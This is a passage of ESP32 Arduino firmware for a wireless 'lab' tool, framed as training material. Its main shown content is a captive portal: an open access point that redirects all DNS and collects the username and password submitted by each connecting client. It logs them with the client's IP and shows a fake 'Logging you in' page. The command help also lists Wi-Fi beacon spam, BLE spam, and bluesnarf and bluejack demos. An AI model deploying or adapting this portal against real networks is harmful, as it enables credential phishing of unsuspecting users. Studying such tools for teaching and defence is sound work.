cpereir89/esp32_wirelesslab/WirelessLab_ESP32/WirelessLab_ESP32.ino
String portalSuccessPage() {
  return R"HTML(
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">

  <meta
    name="viewport"
    content="width=device-width,initial-scale=1"
  >

  <title>Thank you</title>
</head>

<body style="font-family:system-ui;max-width:650px;margin:3rem auto;padding:1rem">
  <h1>Thank you!</h1>

  <p>
    Logging you in...
  </p>
</body>
</html>
)HTML";
}

void configurePortalRoutes() {
  if (portalRoutesConfigured) {
    return;
  }

  webServer.on(
    "/",
    HTTP_ANY,
    []() {
      webServer.send(
        200,
        "text/html",
        portalPage()
      );
    }
  );

  webServer.on(
    "/login",
    HTTP_POST,
    []() {
      String username =
        webServer.arg("username");

      String password =
        webServer.arg("password");

      Serial.println();
      Serial.println(
        "========== PORTAL LAB SUBMISSION =========="
      );

      Serial.printf(
        "[PORTAL] Client: %s\n",
        webServer.client()
          .remoteIP()
          .toString()
          .c_str()
      );

      Serial.println(
        "[PORTAL] POST /login"
      );

      Serial.printf(
        "[PORTAL] Username: %s\n",
        username.c_str()
      );

      Serial.printf(
        "[PORTAL] Password: %s\n",
        password.c_str()
      );

      Serial.println(
        "[PORTAL] Thank you! Logging you in..."
      );

      Serial.println(
        "==========================================="
      );

      printPrompt();

      // Limpiar copias temporales.
      username = "";
      password = "";

      webServer.send(
        200,
        "text/html",
        portalSuccessPage()
      );
    }
  );

  webServer.onNotFound(
    []() {
      webServer.sendHeader(
        "Location",
        "http://192.168.4.1/",
        true
      );

      webServer.send(
        302,
        "text/plain",
        ""
      );
    }
  );

  portalRoutesConfigured = true;
}

void startPortal(
  String ssid
) {
  stopAll();

  currentMode = Mode::PORTAL;

  if (ssid.length() == 0) {
    ssid =
      "WirelessLab32-Demo";
  }

  WiFi.mode(WIFI_AP);

  bool started =
    WiFi.softAP(
      ssid.c_str(),
      nullptr,
      6,
      false,
      4
    );

  if (!started) {
    Serial.println(
      "Could not start captive portal AP."
    );

    currentMode = Mode::IDLE;
    return;
  }

  dnsServer.start(
    53,
    "*",
    WiFi.softAPIP()
  );

  configurePortalRoutes();

  webServer.begin();
  portalActive = true;

  Serial.println(
    "Portal started."
  );

  Serial.printf(
    "SSID: %s\n",
    ssid.c_str()
  );

  Serial.printf(
    "URL: http://%s/\n",
    WiFi.softAPIP()
      .toString()
      .c_str()
  );

  Serial.println(
    "Training username: student"
  );

  Serial.println(
    "Password: any fictional training value"
  );
}

// ============================================================
// Help
// ============================================================

void printHelp() {
  Serial.println();
  Serial.println("System:");
  Serial.println("  help");
  Serial.println("  info");
  Serial.println("  status");
  Serial.println("  stop");
  Serial.println("  reboot");

  Serial.println();
  Serial.println("Wi-Fi:");
  Serial.println("  wifi scan");
  Serial.println("  wifi list");

  Serial.println(
    "  wifi beacon add <ssid>"
  );

  Serial.println(
    "  wifi beacon clear"
  );

  Serial.println(
    "  wifi beacon channel <1-13>"
  );

  Serial.println(
    "  wifi beacon start [seconds]"
  );

  Serial.println(
    "  wifi spam start [seconds]"
  );

  Serial.println(
    "  wifi spam load"
  );

  Serial.println(
    "  portal start [ssid]"
  );

  Serial.println(
    "  portal stop"
  );

  Serial.println();
  Serial.println("BLE:");
  Serial.println("  ble mode");
  Serial.println("  ble scan");
  Serial.println("  ble list");

  Serial.println(
    "  ble advertise start"
  );

  Serial.println(
    "  ble advertise stop"
  );

  Serial.println(
    "  ble spam start [seconds]"
  );

  Serial.println(
    "  ble spam stop"
  );

  Serial.println(
    "  ble spam load"
  );

  Serial.println(
    "  ble spam status"
  );

  Serial.println(
    "  ble bluesnarf demo"
  );

  Serial.println(
    "  ble bluejack demo"
  );

  Serial.println(
    "  ble bluejack send <message>"
  );

  Serial.println(
    "  ble exit"
  );
}

// ============================================================
// Command parser
// ============================================================

void handleCommand(
  String command
) {
  command.trim();

  if (command.length() == 0) {
    return;
  }

  if (command == "help") {
    printHelp();
  }

  else if (command == "info") {
    Serial.printf(
      "Firmware: WirelessLab32\n"
      "Version: %s\n"
      "Chip: %s rev %u\n"
      "CPU: %u MHz\n"
      "Flash: %u bytes\n"
      "Free heap: %u bytes\n"
      "Mode: %s\n",
      FW_VERSION,
      ESP.getChipModel(),
      ESP.getChipRevision(),
      ESP.getCpuFreqMHz(),
      ESP.getFlashChipSize(),
      ESP.getFreeHeap(),
      getModeName().c_str()
    );
  }

  else if (command == "status") {
    Serial.printf(
      "Mode: %s\n"
      "BLE initialized: %s\n"
      "BLE advertising: %s\n"
      "Portal: %s\n",
      getModeName().c_str(),
      bleInitialized
        ? "yes"
        : "no",
      bleAdvertisingActive
        ? "active"
        : "inactive",
      portalActive
        ? "active"
        : "inactive"
    );
  }

  else if (command == "stop") {
    stopAll();
  }

  else if (command == "reboot") {
    Serial.println(
      "Restarting..."
    );

    delay(150);
    ESP.restart();
  }

  else if (command == "wifi scan") {
    runWifiScan();
  }

  else if (command == "wifi list") {
    printWifiList();
  }

  else if (
    command.startsWith(
      "wifi beacon add "
    )
  ) {
    String ssid =
      command.substring(
        String(
          "wifi beacon add "
        ).length()
      );

    ssid.trim();

    if (
      ssid.length() == 0 ||
      ssid.length() > 32
    ) {
      Serial.println(
        "SSID must contain between 1 and 32 characters."
      );
    }

    else if (
      beaconSsids.size() >=
      MAX_BEACON_SSIDS
    ) {
      Serial.println(
        "Maximum of 5 SSIDs reached."
      );
    }

    else {
      beaconSsids.push_back(
        ssid
      );

      Serial.printf(
        "Added beacon SSID: %s\n",
        ssid.c_str()
      );
    }
  }

  else if (
    command ==
    "wifi beacon clear"
  ) {
    beaconSsids.clear();

    Serial.println(
      "Beacon SSID list cleared."
    );
  }

  else if (
    command.startsWith(
      "wifi beacon channel "
    )
  ) {
    int requestedChannel =
      command.substring(
        String(
          "wifi beacon channel "
        ).length()
      ).toInt();

    if (
      requestedChannel < 1 ||
      requestedChannel > 13
    ) {
      Serial.println(
        "Channel must be between 1 and 13."
      );
    } else {
      beaconChannel =
        static_cast<uint8_t>(
          requestedChannel
        );

      Serial.printf(
        "Beacon channel set to %u.\n",
        beaconChannel
      );
    }
  }

  else if (
    command.startsWith(
      "wifi beacon start"
    )
  ) {
    String argument =
      command.substring(
        String(
          "wifi beacon start"
        ).length()
      );

    argument.trim();

    uint8_t seconds =
      argument.length()
        ? static_cast<uint8_t>(
            argument.toInt()
          )
        : 10;

